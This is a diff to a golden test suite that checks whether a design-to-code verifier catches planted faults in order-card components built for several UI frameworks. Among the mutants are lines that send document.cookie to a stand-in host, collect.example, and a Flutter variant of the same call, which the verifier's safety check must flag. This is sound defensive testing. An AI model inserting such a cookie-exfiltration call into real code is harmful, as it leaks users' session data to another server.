@@ -11,6 +11,7 @@ import { afterAll, beforeAll, describe, expect, it } from "vitest";
 import type { Check, VerifyReport } from "@tulpar/core";
 import { loadContext, verifyEntry } from "../../src/pipeline.ts";
 import { loadProject, withAdapter } from "../../src/project.ts";
+import { flutterBin } from "../../../adapters/flutter/src/sdk.ts";
 
 const repo = resolve(import.meta.dirname, "../../..");
 const golden = import.meta.dirname;
@@ -22,6 +23,12 @@ interface Scale {
   body: [size: number, lineHeight: number];
   padding: number;
   gap: number;
+  /** The title's and the body's weights (default 400 and 400). */
+  weights?: [title: number, body: number];
+  /** The title's and the body's colours, as Figma's 0–1 RGB (default greys 0.09 and 0.32). */
+  colors?: [title: [number, number, number], body: [number, number, number]];
+  /** The card's fill (default white): Material 3's surface is not white. */
+  background?: [number, number, number];
 }
 
 /** The order card as Figma's REST JSON: a vertical auto layout, 320 wide, a title and a summary line. */
@@ -29,14 +36,16 @@ export function orderCard(s: Scale) {
   const inner = 320 - 2 * s.padding;
   const titleY = s.padding;
   const bodyY = titleY + s.title[1] + s.gap;
-  const text = (id: string, name: string, characters: string, y: number, [size, line]: [number, number], grey: number) => ({
+  const [titleWeight, bodyWeight] = s.weights ?? [400, 400];
+  const [titleColor, bodyColor] = s.colors ?? [[0.09, 0.09, 0.09], [0.32, 0.32, 0.32]];
+  const text = (id: string, name: string, characters: string, y: number, [size, line]: [number, number], [r, g, b]: [number, number, number], weight: number) => ({
     id,
     name,
     type: "TEXT",
     absoluteBoundingBox: { x: s.padding, y, width: inner, height: line },
     characters,
-    style: { fontFamily: s.font, fontWeight: 400, fontSize: size, lineHeightPx: line, textAlignHorizontal: "LEFT", textAlignVertical: "TOP" },
-    fills: [{ type: "SOLID", color: { r: grey, g: grey, b: grey, a: 1 } }],
+    style: { fontFamily: s.font, fontWeight: weight, fontSize: size, lineHeightPx: line, textAlignHorizontal: "LEFT", textAlignVertical: "TOP" },
+    fills: [{ type: "SOLID", color: { r, g, b, a: 1 } }],
     layoutSizingHorizontal: "FILL",
     layoutSizingVertical: "HUG",
   });
@@ -46,7 +55,7 @@ export function orderCard(s: Scale) {
       name: "Order card",
       type: "FRAME",
       absoluteBoundingBox: { x: 0, y: 0, width: 320, height: bodyY + s.body[1] + s.padding },
-      fills: [{ type: "SOLID", color: { r: 1, g: 1, b: 1, a: 1 } }],
+      fills: [{ type: "SOLID", color: { r: s.background?.[0] ?? 1, g: s.background?.[1] ?? 1, b: s.background?.[2] ?? 1, a: 1 } }],
       layoutMode: "VERTICAL",
       itemSpacing: s.gap,
       paddingTop: s.padding,
@@ -55,7 +64,7 @@ export function orderCard(s: Scale) {
       paddingLeft: s.padding,
       primaryAxisAlignItems: "MIN",
       counterAxisAlignItems: "MIN",
-      children: [text("900:2", "Title", "Order summary", titleY, s.title, 0.09), text("900:3", "Body", "Two items, ready to ship.", bodyY, s.body, 0.32)],
+      children: [text("900:2", "Title", "Order summary", titleY, s.title, titleColor, titleWeight), text("900:3", "Body", "Two items, ready to ship.", bodyY, s.body, bodyColor, bodyWeight)],
     },
     components: {},
     componentSets: {},
@@ -76,6 +85,10 @@ export interface Case {
   scale: Scale;
   /** Present when the project is installed. */
   needs: string;
+  /** A project's own way to plant a mutant, by mutant name (Tailwind classes have no stylesheet to edit). */
+  mutate?: Record<string, ((f: Files) => Files) | undefined>;
+  /** False where the project's toolchain is missing (Flutter runs its tests on Linux, in the Flutter workflow). */
+  available?: () => boolean;
 }
 
 export const cases: Record<string, Case> = Object.fromEntries(([
@@ -119,6 +132,81 @@ export const cases: Record<string, Case> = Object.fromEntries(([
     scale: { font: "Inter", title: [20, 24], body: [14, 24], padding: 20, gap: 0 },
     needs: "node_modules/element-plus",
   },
+  {
+    // Typography sets the type (h6: 500 20/32, body2: 14/20); the stylesheet holds spacing and colour.
+    project: "examples/mui",
+    reference: "mui",
+    entry: "OrderCard.tsx",
+    style: "OrderCard.css",
+    test: "OrderCard.test.tsx",
+    script: "export default function OrderCard() {",
+    scale: { font: "Roboto", title: [20, 32], body: [14, 20], padding: 16, gap: 8, weights: [500, 400], colors: [[0.13, 0.13, 0.13], [0.4, 0.4, 0.4]] },
+    needs: "node_modules/@mui/material",
+  },
+  {
+    project: "examples/chakra",
+    reference: "chakra",
+    entry: "OrderCard.tsx",
+    style: "OrderCard.css",
+    test: "OrderCard.test.tsx",
+    script: "export default function OrderCard() {",
+    scale: { font: "Inter", title: [20, 30], body: [14, 21], padding: 16, gap: 8, weights: [600, 400], colors: [[0.0353, 0.0353, 0.0431], [0.3216, 0.3216, 0.3569]] },
+    needs: "node_modules/@chakra-ui/react",
+  },
+  {
+    project: "examples/radix",
+    reference: "radix",
+    entry: "OrderCard.tsx",
+    style: "OrderCard.css",
+    test: "OrderCard.test.tsx",
+    script: "export default function OrderCard() {",
+    scale: { font: "Inter", title: [20, 28], body: [14, 20], padding: 16, gap: 8, weights: [500, 400], colors: [[0.125, 0.125, 0.125], [0.392, 0.392, 0.392]] },
+    needs: "node_modules/@radix-ui/themes",
+  },
+  {
+    // Web Components: one HTML file (script, style, markup) and a JavaScript test.
+    project: "examples/carbon",
+    reference: "carbon-wc",
+    entry: "OrderCard.html",
+    style: "OrderCard.html",
+    test: "OrderCard.test.js",
+    script: '<script type="module">',
+    scale: { font: "IBM Plex Sans", title: [20, 28], body: [14, 20], padding: 16, gap: 8 },
+    needs: "node_modules/@carbon/web-components",
+  },
+  {
+    // Tailwind: the design system is the theme's classes, so the mutants edit classes, not a stylesheet.
+    project: "examples/shadcn",
+    reference: "shadcn",
+    entry: "OrderCard.tsx",
+    style: "OrderCard.tsx",
+    test: "OrderCard.test.tsx",
+    script: "export default function OrderCard() {",
+    scale: { font: "Geist", title: [20, 28], body: [14, 20], padding: 16, gap: 8, weights: [600, 400], colors: [[0.0394, 0.0394, 0.0394], [0.4515, 0.4515, 0.4515]] },
+    needs: "node_modules/tailwindcss",
+    mutate: {
+      "hard-coded colour": (f) => edit(f, "OrderCard.tsx", (s) => s.replace("text-foreground", "text-[#0a0a0a]")),
+      "no padding: everything inside sits in the corner": (f) => edit(f, "OrderCard.tsx", (s) => s.replace(" p-4", "")),
+    },
+  },
+  {
+    // Material 3's default theme: titleLarge 22/28 in onSurface, bodyMedium 14/20 in onSurfaceVariant, on surface;
+    // spacing from the app's Space scale. Flutter runs its tests on Linux only, in the Flutter workflow.
+    project: "examples/flutter-material",
+    reference: "flutter",
+    entry: "order_card.dart",
+    style: "order_card.dart",
+    test: "order_card_test.dart",
+    script: "  Widget build(BuildContext context) {",
+    scale: { font: "Roboto", title: [22, 28], body: [14, 20], padding: 16, gap: 8, colors: [[0.1137, 0.1059, 0.1255], [0.2863, 0.2706, 0.3098]], background: [0.9961, 0.9686, 1] },
+    needs: "pubspec.yaml",
+    available: () => process.platform !== "win32" && !!flutterBin(),
+    mutate: {
+      "hard-coded colour": (f) => edit(f, "order_card.dart", (s) => s.replace("color: scheme.onSurface)", "color: const Color(0xFF1D1B20))")),
+      "no padding: everything inside sits in the corner": (f) => edit(f, "order_card.dart", (s) => s.replace("EdgeInsets.all(Space.lg)", "EdgeInsets.zero")),
+      "planted call that sends cookies to another server": (f) => edit(f, "order_card.dart", (s) => s.replace("  Widget build(BuildContext context) {", "  Widget build(BuildContext context) {\n    HttpClient().getUrl(Uri.parse('https://collect.example/'));")),
+    },
+  },
 ] satisfies Case[]).map((c) => [c.reference, c]));
 
 type Files = Record<string, string>;
@@ -138,7 +226,7 @@ const mutants: { name: string; mutate: (f: Files, c: Case) => Files; fails: Chec
   },
   {
     name: "no padding: everything inside sits in the corner",
-    mutate: (f, c) => edit(f, c.style, (s) => s.replace(/\n\s*padding: var\([^\n]*;/, "")),
+    mutate: (f, c) => edit(f, c.style, (s) => s.replace(/\n\s*padding: [^\n]*;/, "")),
     fails: "layout",
     detail: /900:2|900:3/,
   },
@@ -146,7 +234,7 @@ const mutants: { name: string; mutate: (f: Files, c: Case) => Files; fails: Chec
     name: "planted call that sends cookies to another server",
     mutate: (f, c) => edit(f, c.entry, (s) => s.replace(c.script, `${c.script}\nfetch("https://collect.example/?c=" + document.cookie);`)),
     fails: "safety",
-    detail: /fetch\(\) calls the network/,
+    detail: /calls the network/,
   },
   {
     name: "a test that fails",
@@ -161,7 +249,7 @@ const failing = (r: VerifyReport) => r.checks.filter((c) => c.status === "fail")
 /** The gate for one project: call from a test file (one per project, so they run in parallel). */
 export function goldenSuite(c: Case): void {
   const root = join(repo, c.project);
-  describe.skipIf(!existsSync(join(root, c.needs)))(`golden: ${c.reference}`, { timeout: 180_000 }, () => {
+  describe.skipIf(!existsSync(join(root, c.needs)) || c.available?.() === false)(`golden: ${c.reference}`, { timeout: 180_000 }, () => {
     const reference: Files = Object.fromEntries(readdirSync(join(golden, c.reference)).map((f) => [f, readFileSync(join(golden, c.reference, f), "utf8")]));
     const design = orderCard(c.scale);
     const work = join(root, ".tulpar", "golden");
@@ -193,7 +281,7 @@ export function goldenSuite(c: Case): void {
 
     for (const m of mutants) {
       it(`catches: ${m.name}`, async () => {
-        const files = m.mutate(reference, c);
+        const files = c.mutate?.[m.name]?.(reference) ?? m.mutate(reference, c);
         expect(files).not.toEqual(reference);
         const report = await run(m.name, files);
         const check = report.checks.find((x) => x.id === m.fails)!;
